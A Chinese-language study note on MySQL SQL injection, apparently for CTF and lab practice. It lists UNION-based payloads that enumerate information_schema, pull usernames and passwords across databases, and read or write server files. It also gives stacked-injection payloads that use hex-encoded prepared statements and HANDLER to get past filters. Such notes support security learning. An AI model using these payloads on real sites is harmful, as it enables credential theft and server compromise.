
---
 一、MYSQL注入:（目的获取当前web权限）
1、判断常见四个信息（系统，用户，数据库名，版本）
2、根据四个信息去选择方案

#mysql注入

**注入思路**

1、数据库版本-看是否符合information_schema查询-version()

```
	MYSQL5.0以上版本：自带的数据库名information_schema
	
	information_schema：存储数据库下的数据库名及表名，列名信息的数据库
	
	information_schema.schemata：记录数据库名信息的表
	
	information_schema.tables：记录表名信息的表
	
	information_schema.columns：记录列名信息表
	
	schema_name：information_schema.schemata记录数据库名信息的列名值
	
	table_schema：information_schema.tables记录数据库名的列名值
	
	table_name：information_schema.tables记录表名的列名值
	
	column_name：information_schema.columns记录列名的列名值
```

2、数据库用户-看是否符合ROOT型注入攻击-user()

```
	root用户：先测试读写，后测试获取数据
	非root用户：直接测试获取数据
```

3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os

```
	linux:大小写严格
	windows:大小写不严
```

4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()

```mysql
	information_schema：存储数据库下的数据库名及表名，列名信息的数据库
	
	information_schema.schemata：记录数据库名信息的表
	
	information_schema.tables：记录表名信息的表
	
	information_schema.columns：记录列名信息表
	
	schema_name：information_schema.schemata记录数据库名信息的列名值
	
	table_schema：information_schema.tables记录数据库名的列名值
	
	table_name：information_schema.tables记录表名的列名值
	
	column_name：information_schema.columns记录列名的列名值
```
	
==注：若无数据回显，可以尝试使前一个语句为false==

**注入示例**

```mysql
获取字段数
order by 6

查看回显位置
union select 1,2,3,4,5,6

在回显位置插入需要查询数据
union select 1,2,3,database(),user(),6
union select 1,2,3,version(),@@version_compile_os,6

若数据库版本大于mysql5.0，则可以查询information_schema库中的库名、表名、字段名信息
group_concat()将数据放入组中输出

查询数据库名demo01下的信息（借助information_schema库）
库名
union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata
表名
union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='demo01'
字段名
union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='admin'
限制显示行数
union select 1,2,3,username,password,6 from admin limit 0,1
```


#PHP-MYSQL-SQL跨库查询
影响条件：当前数据库是否为ROOT用户
测试不同数据库用户：root demo

**跨库注入**
通过B网站的注入点获取A网站的账号密码

```mysql
**跨库查询**
查询库名
union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata
查询表名
union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='zblog'
查询字段名
union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='zbp_member' and table_schema='zblog'
查询zblog库中表
union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member
结果
demo 无法查询information_schema表
root 可以查询任何表

```


#PHP-MYSQL-SQL文件读写
影响条件：
1、当前数据库用户权限
2、secure-file-priv设置

测试不同数据库用户：root demo

```mysql
加载目标文件
union select 1,load_file('d:\\1.txt'),3,4,5,6
上传文件
union select 1,'xiaodi',3,4,5,6 into outfile 'd:\\2.txt'
```

读写的路径获取问题：
	1、报错显示获取路径
	2、phpinfo页面泄漏

如果不知道路径思路：
	利用常见的默认的中间件，数据库等安装路径读取有价值信息(phpinfo())

#sql注入过滤
1、单引号过滤
解决：单引号过滤绕过方式
SQL注入语句中用单引号就不要编码(16进制)，编码就不用单引号（路径，表名，数据库名等）

#access无数据库用户 (asp网站mdb为数据库文件)

access注入 sqlmap 靠字典去猜 又可能猜不到表名 列名


堆叠注入
```
基础思路

查看所有数据库  
1'; show databases;
查看所有数据表
1'; show tables;
爆words数据表的字段  
1';show columns from words;#
爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）  
1';show columns from `1919810931114514`;#

做题思路

1、通过rename进行改表
pyload示范
1';rename table words to BaiMao;rename table 1919810931114514 to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#


rename修改表名
alter修改已知的列
add增加
int整数类型
unsigned无符号类型
not null- 指示某列不能存储 NULL 值。
primary key - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
auto_increment-自动赋值，默认从1开始。


2、编码逃逸 绕过滤
select * from `1919810931114514`;
进行16进制编码加密  
73656c656374202a2066726f6d20603139313938313039333131313435313460
最终payload：  
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#

prepare…from…是预处理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
0x就是把后面的编码格式转换成16进制编码格式
那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare…from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。

3、handler代替select
pyload
1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;
1';handler FlagHere open;handler FlagHere read next;handler FlagHere close;


- 首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。
- 首先打开数据库，开始循环读取，读取成功后进行关闭操作。


```
